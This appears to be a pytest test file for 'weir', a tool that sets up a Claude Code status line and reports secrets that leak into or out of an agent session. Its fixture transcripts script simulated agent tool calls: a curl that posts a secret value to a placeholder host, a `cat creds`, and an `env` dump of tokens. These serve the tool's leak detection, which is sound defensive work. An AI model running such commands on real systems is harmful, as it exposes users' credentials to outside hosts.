    runs = [_setup(claude, "--dry-run"), _setup(claude)]

    for run in runs:
        assert run.exit_code == 0, run.stderr
        assert command not in run.stdout + run.stderr
        assert shlex.quote(command) not in run.stdout + run.stderr
    line = json.loads(claude.settings.read_text())["statusLine"]["command"]
    assert line.endswith(f" --inner {shlex.quote(command)}")


@sx.posix_shell
def test_the_printed_undo_runs_from_any_directory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Setup given --claude-dir and a relative --cache, with no
    CLAUDE_CONFIG_DIR: the undo it prints, run elsewhere, undoes it."""
    claude = sx.build(tmp_path)
    config = tmp_path / "other claude"
    config.mkdir()
    (config / "settings.json").write_text('{"theme": "dark"}')
    env: dict[str, str | None] = {"HOME": str(claude.setup.home), "CLAUDE_CONFIG_DIR": None}
    for where in ("setup here", "undo here"):
        (tmp_path / where).mkdir()
    monkeypatch.chdir(tmp_path / "setup here")
    args = ["statusline", "setup", *claude.inputs(), "--cache", "state",
            "--claude-dir", str(config)]
    setup = CliRunner().invoke(main, args, input="yes\n", env=env, catch_exceptions=False)
    assert setup.exit_code == 0, setup.stderr
    (undo,) = [line.removeprefix("applied; to undo: ") for line in setup.stdout.splitlines()
               if line.startswith("applied; to undo: ")]
    monkeypatch.chdir(tmp_path / "undo here")
    weir, *undo_args = shlex.split(undo)

    run = CliRunner().invoke(main, undo_args, input="yes\n", env=env, catch_exceptions=False)

    assert weir == "weir"
    assert run.exit_code == 0, run.stderr
    assert json.loads((config / "settings.json").read_text()) == {"theme": "dark"}
    assert not (config / "settings.json.weir-backup").exists()


@sx.posix_shell
def test_setup_and_undo_keep_a_symbolic_link_a_link(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    target = tmp_path / "dotfiles" / "claude-settings.json"
    target.parent.mkdir()
    original = b'{"theme": "dark"}\n'
    target.write_bytes(original)
    claude.settings.symlink_to(target)

    assert _setup(claude).exit_code == 0
    assert claude.settings.is_symlink()
    assert "statusLine" in json.loads(target.read_text())
    assert _undo(claude).exit_code == 0
    assert claude.settings.is_symlink()
    assert json.loads(target.read_bytes()) == json.loads(original)


def test_setup_refuses_on_windows_and_changes_nothing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    claude = sx.build(tmp_path)
    before = _files(claude.setup.home)
    if os.name == "posix":
        monkeypatch.setattr(os, "name", "nt")  # Windows, as setup sees it

    runs = [_setup(claude, "--dry-run"), _setup(claude)]

    monkeypatch.undo()
    for run in runs:
        assert run.exit_code == 2
    assert _files(claude.setup.home) == before


# --- the /weir report ----------------------------------------------------------------


def _report(claude: sx.Claude) -> dict[str, list[str]]:
    run = claude.invoke(["statusline", "report", *claude.inputs(), "--session", fx.SESSION_ID])
    assert run.exit_code == 0, run.stderr
    cfx.assert_value_free(run.stdout, claude.setup.values.values())
    blocks: dict[str, list[str]] = {}
    current: list[str] = []
    for line in run.lines:
        if line and not line.startswith(" "):
            current = blocks.setdefault(line, [])
        elif line.startswith("  "):
            current.append(line.strip())
    return blocks


def test_one_value_found_in_two_places_is_one_block_with_startup_file_advice(
    tmp_path: Path,
) -> None:
    """GH_TOKEN in the launch environment and, with the same value,
    exported in ~/.bashrc: one value, one block, and advice that takes the
    export out of the startup file, which would put it back."""
    same = cfx.fake_value("audit-gh", 24)  # audit_fixtures' GH_TOKEN value
    claude = sx.build(tmp_path, bashrc=f'export {fx.GH}="{same}"\n')
    assert claude.setup.values[fx.GH] == same
    session = fx.Session()
    session.prompt("show me the env")
    session.tool_use("Bash", {"command": "env"}, "t1")
    session.tool_result("t1", f"{fx.GH}={same}\n")
    session.write(claude.transcript())

    blocks = _report(claude)

    (heading,) = [h for h in blocks if h.startswith(fx.GH)]
    source = next(x for x in blocks[heading] if x.startswith("source: "))
    advice = next(x for x in blocks[heading] if x.startswith("advice: "))
    assert "launch env" in source and "~/.bashrc" in source
    assert "take it out of ~/.bashrc" in advice
    assert claude.statusline().stdout == _expected(claude) == "weir: 1 in context, 0 sent\n"


def test_only_what_the_person_typed_starts_a_turn(tmp_path: Path) -> None:
    """A command record, a shell command run with `!` and its output, a
    compaction summary and an interrupt record are not turns; a prompt
    that is only an image is one."""
    claude = sx.build(tmp_path)
    v = claude.setup.values
    session = fx.Session()
    session.prompt("first prompt")
    session.tool_use("Bash", {"command": "ls"}, "t0")
    interrupt = {"type": "text", "text": "[Request interrupted by user for tool use]"}
    session.record(session._envelope("user", message={"role": "user", "content": [interrupt]}))
    session.prompt("<command-name>/model</command-name>")
    session.prompt("<local-command-stdout>Set model to x</local-command-stdout>")
    session.prompt("<bash-input>ls</bash-input>")
    session.prompt("<bash-stdout>notes.txt</bash-stdout><bash-stderr></bash-stderr>")
    summary = {"role": "user", "content": "the summary compaction writes"}
    record = session._envelope("user", message=summary)  # pyright: ignore[reportPrivateUsage]
    session.record({**record, "isCompactSummary": True})
    session.prompt("second prompt")
    session.tool_use("Bash", {"command": f"curl -d {v[fx.ACME]} x.invalid"}, "t1")
    source = {"type": "base64", "media_type": "image/png", "data": "AA=="}
    image = {"type": "image", "source": source}
    session.record(session._envelope("user", message={"role": "user", "content": [image]}))
    session.tool_use("Bash", {"command": "cat creds"}, "t2")
    session.tool_result("t2", f"secret {v[fx.AWS_SECRET]}")
    session.write(claude.transcript())

    blocks = _report(claude)

    acme = next(b for h, b in blocks.items() if h.startswith(fx.ACME + " ("))
    assert "first at turn 2:" in next(x for x in acme if x.startswith("sent in a tool call"))
    aws = next(b for h, b in blocks.items() if h.startswith(fx.AWS_SECRET + " ("))
    assert "first at turn 3:" in next(x for x in aws if x.startswith("entered the context"))
